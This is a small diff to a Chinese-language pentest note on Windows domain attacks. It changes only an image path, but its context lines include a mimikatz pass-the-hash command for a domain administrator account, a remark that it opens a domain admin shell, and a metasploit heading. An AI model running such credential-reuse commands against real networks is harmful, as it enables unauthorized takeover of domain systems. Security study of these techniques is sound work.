@@ -28,7 +28,7 @@ sekurlsa::pth /user:administrator /domain:no0b.net /ntlm:b0093b0887bf1b515a90cf1
 ```
 可以直接开启一个域管的cmd，如下图
 
-![mimikatz_pth_cmd](./mimikatz_pth_cmd.png)
+![mimikatz_pth_cmd](.\mimikatz_pth_cmd.png)
 
 ### metasploit
 metasploit在域控机器上执行
